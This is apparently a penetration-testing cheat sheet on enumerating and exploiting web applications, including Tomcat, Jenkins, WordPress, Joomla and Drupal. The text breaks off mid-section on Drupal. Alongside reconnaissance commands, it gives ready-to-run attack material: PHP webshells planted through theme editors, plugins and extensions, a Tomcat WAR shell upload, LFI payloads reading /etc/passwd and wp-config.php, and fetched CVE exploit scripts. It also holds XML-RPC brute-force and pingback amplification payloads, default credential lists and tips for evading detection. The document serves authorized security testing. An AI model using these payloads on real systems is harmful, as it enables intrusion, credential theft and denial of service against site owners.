# Web Application Enumeration Guide

## Table of Contents
1. [Overview](#overview)
2. [Initial Discovery](#initial-discovery)
3. [Browser-Based Enumeration](#browser-based-enumeration)
4. [HTTP Headers & Sitemaps](#http-headers--sitemaps)
5. [API Discovery & Testing](#api-discovery--testing)
6. [Automated Application Discovery](#automated-application-discovery)
7. [Common Applications & Attack Vectors](#common-applications--attack-vectors)

---

## Overview

**Objective**: Identify technology stack, application components, and attack surface
**Scope**: Web servers, APIs, custom applications, administrative interfaces
**Goals**: Technology fingerprinting, vulnerability identification, credential discovery

### Technology Stack Components
- **Operating System**: Windows, Linux, Unix variants
- **Web Server**: Apache, Nginx, IIS, Tomcat
- **Database**: MySQL, MSSQL, PostgreSQL, Oracle
- **Programming Language**: PHP, ASP.NET, Java, Python, Node.js
- **Frameworks**: Laravel, Django, Spring, Express

---

## Initial Discovery

### Port Scanning for Web Services
```bash
# Common web ports discovery
nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list

# Extended web ports scan
nmap -p 80-90,443,8000-8090,9000-9090,10000-10090 --open -sV target

# Service version detection
nmap --open -sV -p- target_ip
```

### Scope Organization
```bash
# Create scope file
cat > scope_list << EOF
app.company.com
dev.company.com
api.company.com
admin.company.com
10.10.10.0/24
EOF

# Quick live host discovery
nmap -sn -iL scope_list
```

### Essential Enumeration Checklist
- [ ] Port scan for web services
- [ ] Technology stack identification
- [ ] Directory/file enumeration
- [ ] Subdomain discovery
- [ ] API endpoint identification
- [ ] Administrative interface discovery

---

## Browser-Based Enumeration

### Developer Tools Analysis

#### Source Code Inspection
```javascript
// Firefox: F12 > Debugger tab
// Look for:
// - JavaScript frameworks (jQuery, React, Angular)
// - Hidden form fields
// - Comments with sensitive information
// - Client-side validation logic
// - API endpoints in JavaScript
```

#### Network Tab Analysis
```
Firefox: F12 > Network tab
- Monitor HTTP requests/responses
- Identify AJAX calls
- Check request/response headers
- Look for API calls
- Examine WebSocket connections
```

#### Inspector Tool Usage
```html
<!-- Right-click element > Inspect -->
<!-- Look for: -->
<!-- - Hidden input fields -->
<!-- - Disabled form elements -->
<!-- - Client-side controls -->
<!-- - Embedded credentials -->
<!-- - Debug parameters -->
```

### File Extension Analysis
```
Common extensions and technologies:
.php        - PHP
.asp/.aspx  - ASP.NET
.jsp        - Java Server Pages
.do         - Java Struts
.py         - Python
.rb         - Ruby
.js         - JavaScript/Node.js
```

---

## HTTP Headers & Sitemaps

### Response Header Enumeration
```bash
# Manual header inspection
curl -I http://target.com

# Comprehensive header analysis
curl -i -X GET http://target.com
curl -i -X OPTIONS http://target.com
```

### Key Headers to Analyze
```
Server: Apache/2.4.41 (Ubuntu)           # Web server version
X-Powered-By: PHP/7.4.3                  # Programming language
X-AspNet-Version: 4.0.30319              # .NET version
X-Amz-Cf-Id: [value]                     # Amazon CloudFront
X-Frame-Options: DENY                    # Security headers
Content-Security-Policy: [policy]        # CSP implementation
Set-Cookie: PHPSESSID=abc123             # Session management
```

### Sitemap & Robots.txt Discovery
```bash
# Robots.txt examination
curl http://target.com/robots.txt

# Common sitemap locations
curl http://target.com/sitemap.xml
curl http://target.com/sitemap_index.xml
curl http://target.com/sitemap.txt

# Wayback Machine enumeration
curl "http://web.archive.org/cdx/search/cdx?url=target.com/*&output=text&fl=original&collapse=urlkey"
```

---

## API Discovery & Testing

### API Endpoint Discovery

#### Gobuster API Enumeration
```bash
# Create API pattern file
cat > api_patterns.txt << EOF
{GOBUSTER}/v1
{GOBUSTER}/v2
{GOBUSTER}/api
{GOBUSTER}/rest
EOF

# API directory discovery
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/big.txt -p api_patterns.txt

# Common API paths
gobuster dir -u http://target.com -w /usr/share/wordlists/api_endpoints.txt
```

#### Manual API Discovery
```bash
# Common API endpoints to test
/api/
/api/v1/
/api/v2/
/rest/
/graphql
/swagger/
/docs/
/openapi.json
```

### API Testing Methodology

#### Initial API Reconnaissance
```bash
# Basic API information gathering
curl -i http://target.com:5001/api/v1/users
curl -i http://target.com:5001/api/v1/books

# Check for API documentation
curl http://target.com/swagger.json
curl http://target.com/api-docs
curl http://target.com/openapi.json
```

#### HTTP Method Testing
```bash
# Test different HTTP methods
curl -X GET http://target.com/api/v1/users
curl -X POST http://target.com/api/v1/users
curl -X PUT http://target.com/api/v1/users
curl -X DELETE http://target.com/api/v1/users
curl -X PATCH http://target.com/api/v1/users
curl -X OPTIONS http://target.com/api/v1/users
```

### API Exploitation Examples

#### User Registration Abuse
```bash
# Standard registration
curl -d '{"username":"test","password":"pass","email":"test@test.com"}' \
  -H 'Content-Type: application/json' \
  http://target.com/api/v1/register

# Privilege escalation attempt
curl -d '{"username":"admin2","password":"pass","email":"admin@test.com","admin":"True"}' \
  -H 'Content-Type: application/json' \
  http://target.com/api/v1/register
```

#### Authentication Bypass
```bash
# Login with created account
curl -d '{"username":"admin2","password":"pass"}' \
  -H 'Content-Type: application/json' \
  http://target.com/api/v1/login

# Extract JWT token from response
# Use token for privileged operations
curl -X PUT \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer JWT_TOKEN_HERE' \
  -d '{"password":"pwned"}' \
  http://target.com/api/v1/admin/password
```

#### Advanced API Testing
```bash
# Parameter pollution
curl "http://target.com/api/v1/users?id=1&id=2"

# Mass assignment
curl -d '{"username":"test","role":"admin","permissions":["all"]}' \
  -H 'Content-Type: application/json' \
  http://target.com/api/v1/users

# IDOR testing
curl -H 'Authorization: Bearer TOKEN' \
  http://target.com/api/v1/users/1/profile
curl -H 'Authorization: Bearer TOKEN' \
  http://target.com/api/v1/users/2/profile
```

---

## Automated Application Discovery

### EyeWitness Usage
```bash
# Installation
sudo apt install eyewitness

# Basic usage with Nmap XML
eyewitness --web -x nmap_scan.xml -d output_directory

# URL list input
eyewitness --web -f url_list.txt -d screenshots

# Custom options
eyewitness --web -x scan.xml --threads 10 --timeout 30 -d results
```

### Aquatone Usage
```bash
# Download and setup
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
unzip aquatone_linux_amd64_1.7.0.zip

# Basic usage
cat nmap_scan.xml | ./aquatone -nmap

# URL list input
cat urls.txt | ./aquatone

# Custom ports
cat hosts.txt | ./aquatone -ports 80,443,8080,8443,9000
```

### Screenshot Analysis Priorities
1. **High Value Targets**:
   - Apache Tomcat manager interfaces
   - Jenkins CI/CD platforms
   - Administrative dashboards
   - Database management tools

2. **Custom Applications**:
   - Company-specific portals
   - Internal tools
   - Legacy applications

3. **Common Vulnerabilities**:
   - Default credentials
   - Outdated software versions
   - Exposed configuration files

---

## Common Applications & Attack Vectors

### High-Value Targets

#### Apache Tomcat
```bash
# Manager interface discovery
curl http://target.com:8080/manager/html
curl http://target.com:8080/host-manager/html

# Default credentials testing
curl -u 'tomcat:tomcat' http://target.com:8080/manager/html
curl -u 'admin:admin' http://target.com:8080/manager/html
curl -u 'manager:manager' http://target.com:8080/manager/html

# WAR file upload for RCE
curl -u 'tomcat:s3cret' --upload-file shell.war \
  'http://target.com:8080/manager/text/deploy?path=/shell'
```

#### Jenkins
```bash
# Common Jenkins paths
/jenkins/
/ci/
/build/

# Default paths to test
curl http://target.com:8080/jenkins/script
curl http://target.com:8080/jenkins/manage
curl http://target.com:8080/jenkins/configure

# Groovy script console (if accessible)
# Execute: "whoami".execute().text
```

#### GitLab/Git Repositories
```bash
# Public repositories discovery
curl http://gitlab.target.com/public
curl http://target.com/.git/config
curl http://target.com/.git/HEAD

# Git enumeration
git-dumper http://target.com/.git/ output_directory
```

### CMS Identification & Testing

#### WordPress
```bash
# WordPress detection
curl http://target.com/wp-admin/
curl http://target.com/wp-content/
curl http://target.com/wp-json/wp/v2/users

# WPScan usage
wpscan --url http://target.com --enumerate u,p,t
```

#### Drupal
```bash
# Drupal detection
curl http://target.com/CHANGELOG.txt
curl http://target.com/user/login
curl http://target.com/admin/config

# Version fingerprinting
curl -s http://target.com/ | grep -i "drupal"
```

### Network Appliances

#### PRTG Network Monitor
```bash
# Default credentials
Username: prtgadmin
Password: prtgadmin

# Login testing
curl -d "username=prtgadmin&password=prtgadmin" \
  http://target.com:8080/public/checklogin.htm
```

#### Splunk
```bash
# Default credentials
Username: admin
Password: changeme

# Splunk detection
curl http://target.com:8000/en-GB/account/login
curl http://target.com:8089/services/server/info
```

---

## Directory & File Enumeration

### Gobuster Directory Discovery
```bash
# Basic directory enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Comprehensive scan
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,asp,aspx,jsp,html,txt -t 50

# API-specific wordlists
gobuster dir -u http://target.com -w /usr/share/wordlists/api_endpoints.txt
```

### File Extension Discovery
```bash
# Technology-specific extensions
# PHP applications
gobuster dir -u http://target.com -w wordlist.txt -x php,php3,php4,php5,phtml

# ASP.NET applications
gobuster dir -u http://target.com -w wordlist.txt -x asp,aspx,asmx,ashx

# Java applications
gobuster dir -u http://target.com -w wordlist.txt -x jsp,jspx,do,action
```

### Configuration File Discovery
```bash
# Common configuration files
curl http://target.com/web.config
curl http://target.com/app.config
curl http://target.com/.env
curl http://target.com/config.php
curl http://target.com/wp-config.php
curl http://target.com/database.yml
```

---

## Advanced Enumeration Techniques

### Virtual Host Discovery
```bash
# Subdomain enumeration
gobuster vhost -u http://target.com -w /usr/share/wordlists/subdomains.txt

# Manual vhost testing
curl -H "Host: admin.target.com" http://target_ip
curl -H "Host: dev.target.com" http://target_ip
curl -H "Host: api.target.com" http://target_ip
```

### Technology Stack Fingerprinting
```bash
# Whatweb usage
whatweb http://target.com

# Manual fingerprinting
curl -I http://target.com | grep -E "(Server|X-Powered-By|X-AspNet-Version)"

# Wappalyzer CLI
wappalyzer http://target.com
```

### Error Page Information Gathering
```bash
# Force error pages
curl http://target.com/nonexistent_page
curl http://target.com/admin/test
curl -X POST http://target.com/api/invalid

# SQL injection error testing
curl "http://target.com/page?id=1'"
curl "http://target.com/search?q=test\""
```

---

## Organization & Documentation

### Notetaking Structure
```
Web Application Assessment - <Client>
├── Scope
│   ├── In-scope URLs/IPs
│   ├── Out-of-scope items
│   └── Testing constraints
├── Discovery
│   ├── Port scans
│   ├── Service enumeration
│   └── Technology identification
├── Application Inventory
│   ├── Custom applications
│   ├── CMS platforms
│   ├── Administrative interfaces
│   └── Network appliances
├── Vulnerabilities
│   ├── Authentication issues
│   ├── Input validation flaws
│   ├── Authorization bypasses
│   └── Information disclosure
└── Exploitation
    ├── Proof-of-concept
    ├── Impact assessment
    └── Remediation guidance
```

### Key Information to Document
- **URLs and ports**: Complete application inventory
- **Technology stack**: Versions and configurations
- **Credentials found**: Default or weak passwords
- **Error messages**: Information disclosure
- **API endpoints**: Functionality and access controls
- **File/directory paths**: Sensitive locations
- **Administrative interfaces**: Management consoles

---

## Quick Reference Commands

### Essential Enumeration Commands
```bash
# Initial web discovery
nmap -p 80,443,8000,8080,8180,8888,10000 --open -sV target

# HTTP methods testing
curl -X OPTIONS http://target.com

# Header analysis
curl -I http://target.com

# Directory enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# API discovery
gobuster dir -u http://target.com/api -w api_wordlist.txt

# Screenshot generation
eyewitness --web -f urls.txt -d screenshots

# Technology fingerprinting
whatweb http://target.com
```

### Common Default Credentials
```
Application         Username        Password
Tomcat             tomcat          tomcat
Tomcat             admin           admin
Jenkins            admin           password
GitLab             root            5iveL!fe
Splunk             admin           changeme
PRTG               prtgadmin       prtgadmin
phpMyAdmin         root            (blank)
```

---

## WordPress Enumeration & Exploitation

### Overview
- **Market Share**: ~32.5% of all websites globally
- **Architecture**: PHP-based CMS with MySQL backend
- **Attack Surface**: Core + 50,000+ plugins + 4,100+ themes
- **Vulnerability Distribution**: 54% plugins, 31.5% core, 14.5% themes

### WordPress Discovery

#### Initial Identification
```bash
# Robots.txt analysis
curl http://target.com/robots.txt

# Look for WordPress indicators:
# /wp-admin/
# /wp-content/
# /wp-includes/
```

#### Version Detection
```bash
# Meta generator tag
curl -s http://target.com | grep -i "generator.*wordpress"

# WordPress version in source
curl -s http://target.com | grep -oP 'WordPress \K[\d\.]+'

# Version from feeds
curl -s http://target.com/?feed=rss2 | grep -i generator
```

#### Directory Structure
```
WordPress Standard Directories:
/wp-admin/          - Administrative interface
/wp-content/        - Themes, plugins, uploads
/wp-includes/       - Core WordPress files
/wp-content/themes/ - Theme files
/wp-content/plugins/ - Plugin files
/wp-content/uploads/ - User uploads
```

### Manual Enumeration

#### Theme Discovery
```bash
# Extract theme information
curl -s http://target.com | grep -oP 'themes/[^/]+' | sort -u

# Theme details from source
curl -s http://target.com | grep -E "(themes|wp-content)" | grep -oP 'themes/\K[^/]+'

# Check theme readme files
curl http://target.com/wp-content/themes/theme-name/readme.txt
curl http://target.com/wp-content/themes/theme-name/style.css
```

#### Plugin Enumeration
```bash
# Extract plugins from source
curl -s http://target.com | grep -oP 'plugins/[^/]+' | sort -u

# Common plugin paths
curl http://target.com/wp-content/plugins/
curl http://target.com/wp-content/plugins/akismet/
curl http://target.com/wp-content/plugins/contact-form-7/

# Plugin version detection
curl -s http://target.com | grep -oP 'plugins/[^/]+/[^?]*\?ver=\K[\d\.]+'
```

#### User Enumeration
```bash
# Author enumeration via REST API
curl http://target.com/wp-json/wp/v2/users

# Author ID brute force
curl http://target.com/?author=1
curl http://target.com/?author=2

# Login error messages
curl -d "log=admin&pwd=wrong" http://target.com/wp-login.php
# Valid user: "The password for username admin is incorrect"
# Invalid user: "The username someone is not registered on this site"
```

#### Configuration Discovery
```bash
# Common WordPress files
curl http://target.com/wp-config.php
curl http://target.com/wp-config.php.bak
curl http://target.com/readme.html
curl http://target.com/xmlrpc.php

# Debug information
curl http://target.com/wp-content/debug.log
```

### WPScan Automated Enumeration

#### Installation & Setup
```bash
# Install WPScan
sudo gem install wpscan

# Get API token from WPVulnDB (free: 75 requests/day)
# Register at: https://wpvulndb.com/users/sign_up
```

#### Basic Enumeration
```bash
# Standard enumeration
wpscan --url http://target.com --enumerate

# Specific enumeration options
wpscan --url http://target.com --enumerate u    # Users
wpscan --url http://target.com --enumerate p    # Plugins
wpscan --url http://target.com --enumerate t    # Themes
wpscan --url http://target.com --enumerate ap   # All plugins
wpscan --url http://target.com --enumerate at   # All themes

# With API token for vulnerability data
wpscan --url http://target.com --enumerate --api-token YOUR_TOKEN
```

#### Advanced Scanning
```bash
# Aggressive detection
wpscan --url http://target.com --enumerate --detection-mode aggressive

# Custom user agent
wpscan --url http://target.com --ua "Custom User Agent"

# Through proxy
wpscan --url http://target.com --proxy socks5://127.0.0.1:9050

# Increase threads (default: 5)
wpscan --url http://target.com --enumerate -t 10
```

### User Enumeration & Authentication

#### WordPress User Roles
```
Administrator - Full system access, code execution capability
Editor       - Publish/manage all posts, access to files
Author       - Publish/manage own posts
Contributor  - Write/manage own posts (cannot publish)
Subscriber   - Read posts, edit own profile
```

#### Password Attacks
```bash
# XML-RPC brute force (faster)
wpscan --url http://target.com --password-attack xmlrpc -U users.txt -P passwords.txt

# Standard login brute force
wpscan --url http://target.com --password-attack wp-login -U admin -P /usr/share/wordlists/rockyou.txt

# Single user brute force
wpscan --url http://target.com --password-attack xmlrpc -U admin -P passwords.txt -t 20

# Multiple users from file
wpscan --url http://target.com --password-attack xmlrpc -U users.txt -P passwords.txt
```

### WordPress Exploitation

#### Theme Editor Code Execution
```php
# Login with admin credentials
# Navigate to: Appearance > Theme Editor
# Select inactive theme (e.g., Twenty Nineteen)
# Edit 404.php or another uncommon file
# Add PHP code execution:

<?php system($_GET['cmd']); ?>

# Access webshell:
# http://target.com/wp-content/themes/twentynineteen/404.php?cmd=id
```

#### Plugin Upload RCE (Admin Access Required)
```bash
# Create malicious plugin
cat > shell.php << 'EOF'
<?php
/*
Plugin Name: Shell
Description: Webshell
Version: 1.0
*/
system($_GET['cmd']);
?>
EOF

# Zip the plugin
zip shell.zip shell.php

# Upload via: Plugins > Add New > Upload Plugin
# Activate and access: /wp-content/plugins/shell/shell.php?cmd=id
```

#### Metasploit Exploitation
```bash
# WordPress admin shell upload
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS target_ip
set VHOST target.com
set USERNAME admin
set PASSWORD password123
set LHOST attacker_ip
exploit
```

### Common WordPress Vulnerabilities

#### Plugin Vulnerabilities

##### mail-masta LFI
```bash
# Vulnerable parameter: pl
curl "http://target.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"

# Windows version
curl "http://target.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=C:/windows/system32/drivers/etc/hosts"

# WordPress config extraction
curl "http://target.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=../../../wp-config.php"
```

##### wpDiscuz RCE (CVE-2020-24186)
```bash
# Download exploit
wget https://github.com/hevox/CVE-2020-24186/raw/main/wp_discuz.py

# Execute exploit
python3 wp_discuz.py -u http://target.com -p "/?p=1"

# Manual exploitation if script fails
curl "http://target.com/wp-content/uploads/YEAR/MONTH/webshell.php?cmd=id"
```

#### XML-RPC Exploitation
```bash
# XML-RPC detection
curl -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://target.com/xmlrpc.php

# Brute force via XML-RPC
curl -X POST -d "<?xml version='1.0'?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>password</value></param></params></methodCall>" http://target.com/xmlrpc.php

# Amplification attacks (DDoS)
curl -X POST -d "<?xml version='1.0'?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>pingback.ping</string></value></member><member><name>params</name><value><array><data><value><string>http://attacker.com</string></value><value><string>http://target.com/existing-post</string></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>" http://target.com/xmlrpc.php
```

### WordPress Security Testing Checklist

#### Discovery & Enumeration
- [ ] WordPress version identification
- [ ] Theme name and version detection
- [ ] Plugin enumeration and version detection
- [ ] User enumeration via multiple methods
- [ ] Directory listing checks
- [ ] Configuration file exposure
- [ ] XML-RPC functionality assessment

#### Authentication Testing
- [ ] Default credentials testing
- [ ] Password brute forcing (XML-RPC preferred)
- [ ] Username enumeration via login errors
- [ ] Session management testing

#### Plugin & Theme Testing
- [ ] Known vulnerability scanning
- [ ] Directory traversal in plugins
- [ ] SQL injection in custom plugins
- [ ] File upload vulnerabilities
- [ ] Cross-site scripting (XSS) testing

#### Administrative Access Testing
- [ ] Theme editor code execution
- [ ] Plugin upload capabilities
- [ ] File manager plugin abuse
- [ ] Database access via admin panel

### WordPress Attack Vectors Summary

| Attack Vector | Requirements | Impact | Detection Method |
|---------------|--------------|---------|------------------|
| **Brute Force** | XML-RPC enabled | Account compromise | Login error analysis |
| **Plugin LFI** | Vulnerable plugin | File disclosure | Plugin enumeration |
| **Plugin RCE** | Vulnerable plugin | Remote code execution | Version detection |
| **Theme Editor** | Admin access | Code execution | Authentication |
| **Plugin Upload** | Admin access | Code execution | File upload testing |
| **XML-RPC Abuse** | XML-RPC enabled | DDoS, brute force | XML-RPC detection |

### Common WordPress Files to Check
```bash
# Configuration files
/wp-config.php
/wp-config.php.bak
/wp-config.php.save
/.wp-config.php.swp

# Information disclosure
/readme.html
/wp-admin/install.php
/wp-content/debug.log
/wp-includes/version.php

# Backup files
/wp-content/backup/
/wp-content/backups/
/backup.sql
/database.sql
```

---

## Joomla Enumeration & Exploitation

### Overview
- **Market Share**: 3.5% of CMS market, 3% of all websites
- **Architecture**: PHP-based CMS with MySQL backend
- **Extensions**: 7,000+ extensions and 1,000+ templates
- **Active Installs**: ~2.7 million worldwide
- **Vulnerability Stats**: 426+ CVEs, mostly in extensions

### Joomla Discovery

#### Initial Identification
```bash
# Meta generator tag detection
curl -s http://target.com | grep -i "joomla"

# Typical output:
# <meta name="generator" content="Joomla! - Open Source Content Management" />
```

#### Robots.txt Analysis
```bash
# Joomla robots.txt indicators
curl http://target.com/robots.txt

# Common Joomla directories in robots.txt:
# /administrator/
# /bin/
# /cache/
# /cli/
# /components/
# /includes/
# /installation/
# /language/
# /layouts/
# /libraries/
# /logs/
# /modules/
# /plugins/
# /tmp/
```

#### Version Detection
```bash
# README.txt file
curl -s http://target.com/README.txt | head -n 5

# Administrator manifest file
curl -s http://target.com/administrator/manifests/files/joomla.xml | xmllint --format -

# Cache.xml version info
curl http://target.com/plugins/system/cache/cache.xml

# JavaScript files
curl http://target.com/media/system/js/core.js
```

#### Standard Directory Structure
```
Joomla Standard Directories:
/administrator/     - Admin interface
/components/        - Core components
/modules/          - Modules (like widgets)
/plugins/          - Plugin files
/templates/        - Template files
/images/           - Media uploads
/cache/            - Cache files
/logs/             - Log files
/tmp/              - Temporary files
/cli/              - Command line scripts
```

### Automated Enumeration Tools

#### Droopescan
```bash
# Installation
sudo pip3 install droopescan

# Basic Joomla scan
droopescan scan joomla --url http://target.com

# With threads (default: 4)
droopescan scan joomla --url http://target.com --threads 8

# Enumerate plugins/themes
droopescan scan joomla --url http://target.com --enumerate p,t
```

#### JoomlaScan (Python 2.7)
```bash
# Prerequisites installation
sudo python2.7 -m pip install urllib3 certifi bs4

# Basic scan
python2.7 joomlascan.py -u http://target.com

# Scan with specific user agent
python2.7 joomlascan.py -u http://target.com --ua "Custom-Agent"
```

### Manual Enumeration Techniques

#### Component Discovery
```bash
# Common Joomla components
curl http://target.com/index.php?option=com_content
curl http://target.com/index.php?option=com_users
curl http://target.com/index.php?option=com_contact

# Component enumeration via directory listing
curl http://target.com/components/
curl http://target.com/administrator/components/

# Component manifest files
curl http://target.com/administrator/components/com_admin/admin.xml
```

#### Module & Plugin Enumeration
```bash
# Module discovery
curl http://target.com/modules/
curl http://target.com/administrator/modules/

# Plugin discovery
curl http://target.com/plugins/
curl http://target.com/plugins/system/cache/cache.xml

# Template enumeration
curl http://target.com/templates/
curl http://target.com/administrator/templates/
```

#### Configuration File Discovery
```bash
# Configuration files
curl http://target.com/configuration.php
curl http://target.com/configuration.php.bak
curl http://target.com/configuration.php.save

# Installation files (should be removed)
curl http://target.com/installation/
curl http://target.com/installation/index.php

# Log files
curl http://target.com/logs/
curl http://target.com/administrator/logs/error.php
```

### Authentication Testing

#### Admin Portal Location
```bash
# Standard admin URL
curl http://target.com/administrator/
curl http://target.com/administrator/index.php

# Alternative admin paths
curl http://target.com/admin/
curl http://target.com/backend/
```

#### User Enumeration Limitations
```
Joomla Error Message Analysis:
- Valid/Invalid credentials: "Username and password do not match or you do not have an account yet."
- No username enumeration via login errors (unlike WordPress)
- No REST API user enumeration (unlike WordPress)
```

#### Password Brute Force
```bash
# Manual brute force script
wget https://raw.githubusercontent.com/ajnik/joomla-bruteforce/master/joomla-brute.py

# Basic brute force
python3 joomla-brute.py -u http://target.com -w passwords.txt -usr admin

# Common credentials to test:
admin:admin
admin:password
admin:joomla
administrator:admin
```

### Joomla Exploitation

#### Template Modification (Admin Access Required)
```php
# Step 1: Login to administrator panel
# Step 2: Navigate to Extensions > Templates > Templates (Site)
# Step 3: Select a template (e.g., Protostar)
# Step 4: Edit a PHP file (e.g., error.php)
# Step 5: Add PHP code execution:

<?php system($_GET['cmd']); ?>

# Alternative one-liner:
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);

# Access webshell:
curl "http://target.com/templates/protostar/error.php?cmd=id"
```

#### Extension Installation RCE
```bash
# Create malicious Joomla extension
cat > shell.php << 'EOF'
<?php
/*
 * Extension Name: Shell
 * Version: 1.0
 */
system($_GET['cmd']);
?>
EOF

# Create extension manifest
cat > shell.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<extension type="plugin" version="3.0" group="content">
    <name>Shell</name>
    <version>1.0</version>
    <files>
        <file plugin="shell">shell.php</file>
    </files>
</extension>
EOF

# Create extension package
zip shell.zip shell.php shell.xml

# Upload via: Extensions > Manage > Install
```

### Known Vulnerabilities

#### Directory Traversal (CVE-2019-10945)
```bash
# Affects: Joomla 1.5.0 through 3.9.4
# Download exploit
wget https://raw.githubusercontent.com/murataydemir/CVE-2019-10945/master/exploit.py

# Execute directory traversal
python2.7 joomla_dir_trav.py \
  --url "http://target.com/administrator/" \
  --username admin \
  --password admin \
  --dir /

# List web root contents
python2.7 joomla_dir_trav.py \
  --url "http://target.com/administrator/" \
  --username admin \
  --password admin \
  --dir /var/www/html
```

#### SQL Injection in Extensions
```bash
# Common vulnerable components
# com_eshop - Multiple SQLi vulnerabilities
# com_jdownloads - SQL injection
# com_fabrik - Authentication bypass

# Manual testing
curl "http://target.com/index.php?option=com_eshop&view=product&id=1'"
curl "http://target.com/index.php?option=com_jdownloads&view=summary&catid=1'"
```

#### File Upload Vulnerabilities
```bash
# Media manager exploitation (if accessible)
curl -X POST -F "file=@shell.php" \
  http://target.com/administrator/index.php?option=com_media

# Component-specific file uploads
curl -X POST -F "upload=@shell.jpg.php" \
  http://target.com/index.php?option=com_component&task=upload
```

### Joomla Security Testing Checklist

#### Discovery & Version Detection
- [ ] Joomla version identification
- [ ] Component enumeration
- [ ] Module and plugin discovery
- [ ] Template identification
- [ ] Configuration file exposure
- [ ] Installation directory presence

#### Authentication Testing
- [ ] Default credentials testing (admin:admin)
- [ ] Password brute force via admin portal
- [ ] Session management analysis
- [ ] Two-factor authentication bypass

#### Extension Testing
- [ ] Vulnerable component identification
- [ ] SQL injection in custom components
- [ ] File upload vulnerabilities
- [ ] Cross-site scripting (XSS)
- [ ] Directory traversal in extensions

#### Administrative Access Testing
- [ ] Template modification for RCE
- [ ] Extension installation capabilities
- [ ] File manager access
- [ ] Database access via admin panel
- [ ] System information disclosure

### Common Joomla Vulnerabilities

| Vulnerability Type | Common Locations | Testing Method |
|-------------------|------------------|----------------|
| **SQL Injection** | Custom components | Parameter fuzzing |
| **File Upload** | Media manager, forms | Malicious file upload |
| **Directory Traversal** | File inclusion | Path manipulation |
| **XSS** | User inputs, comments | Script injection |
| **RCE** | Template editing | Admin access required |
| **Information Disclosure** | Config files, logs | Direct file access |

### Joomla Attack Vectors Summary

#### High-Value Targets
1. **Administrator Portal**: `/administrator/` - Admin access
2. **Configuration Files**: `configuration.php` - Database credentials
3. **Template Files**: `/templates/` - Code execution via admin
4. **Extension Files**: `/components/` - Vulnerable extensions
5. **Media Directory**: `/images/` - File upload capabilities

#### Common Default Paths
```bash
# Administrative interfaces
/administrator/
/administrator/index.php

# Configuration and sensitive files
/configuration.php
/htaccess.txt
/web.config.txt
/LICENSE.txt
/README.txt

# Component directories
/components/com_content/
/components/com_users/
/components/com_contact/

# Extension directories
/modules/mod_login/
/plugins/system/
/templates/protostar/
```

### Detection Evasion
```bash
# User agent modification
curl -H "User-Agent: Mozilla/5.0 Joomla Scanner" http://target.com

# Rate limiting bypass
for i in {1..10}; do curl http://target.com/path$i; sleep 2; done

# Proxy rotation
curl --proxy socks5://127.0.0.1:9050 http://target.com
```

### Post-Exploitation Cleanup
```bash
# Files to remove after testing:
# - Modified template files
# - Uploaded webshells
# - Malicious extensions
# - Test files in /tmp/

# Report artifacts:
# - File paths modified
# - Extensions installed
# - Database changes made
```

---

## Drupal Enumeration & Exploitation

### Overview
- **Market Share**: 1.5% of all websites, 2.4% of CMS market
- **Architecture**: PHP-based CMS with MySQL/PostgreSQL backend
- **Extensions**: 43,000+ modules and 2,900+ themes
- **Active Installs**: ~950,000 instances worldwide
- **Notable Users**: Tesla, Warner Bros, 56% of government websites

### Drupal Discovery

#### Initial Identification
```bash
# Meta generator tag detection
curl -s http://target.com | grep -i "drupal"

# Typical output:
# <meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
# <span>Powered by <a href="https://www.drupal.org">Drupal</a></span>
```

#### Node-Based Detection
```bash
# Drupal uses node-based content structure
curl http://target.com/node/1
curl http://target.com/node/2

# Standard user paths
curl http://target.com/user/login
curl http://target.com/user/register
```

#### Version Detection Methods
```bash
# CHANGELOG.txt file (older versions)
curl -s http://target.com/CHANGELOG.txt | grep -m2 ""

# README.txt file
curl -s http://target.com/README.txt | head -n 10

# Core JavaScript files
curl http://target.com/core/misc/drupal.js
curl http://target.com/misc/drupal.js

# CSS version indicators
curl -s http://target.com/core/themes/stable/css/system/components/js.module.css
```

#### Standard Directory Structure
```
Drupal Standard Directories:
/admin/             - Administrative interface
/core/              - Drupal core files (v8+)
/modules/           - Contributed modules
/profiles/          - Installation profiles  
/sites/             - Site-specific files
/themes/            - Theme files
/vendor/            - Third-party libraries (v8+)
/node/              - Content nodes
/user/              - User management
```

### Automated Enumeration

#### Droopescan (Recommended)
```bash
# Installation
sudo pip3 install droopescan

# Basic Drupal scan
droopescan scan drupal -u http://target.com

# Enumerate modules and themes
droopescan scan drupal -u http://target.com -e m,t

# Threads and verbosity
droopescan scan drupal -u http://target.com -t 32 --verbose
```

#### Manual Enumeration Techniques

##### Module Discovery
```bash
# Common module paths
curl http://target.com/sites/all/modules/
curl http://target.com/modules/contrib/
curl http://target.com/core/modules/

# Specific module testing
curl http://target.com/sites/all/modules/views/
curl http://target.com/sites/all/modules/admin_menu/
curl http://target.com/modules/php/LICENSE.txt
```

##### Theme Enumeration
```bash
# Theme directories
curl http://target.com/sites/all/themes/
curl http://target.com/core/themes/
curl http://target.com/themes/

# Default themes
curl http://target.com/themes/bartik/
curl http://target.com/themes/seven/
curl http://target.com/core/themes/classy/
```

##### Configuration Discovery
```bash
# Settings files (usually protected)
curl http://target.com/sites/default/settings.php
curl http://target.com/sites/default/files/
curl http://target.com/sites/default/private/

# Service files
curl http://target.com/sites/default/default.services.yml
curl http://target.com/web.config
```

### Drupal User Roles

#### Default User Types
```
Administrator    - Complete system control
Authenticated    - Logged-in users with permissions
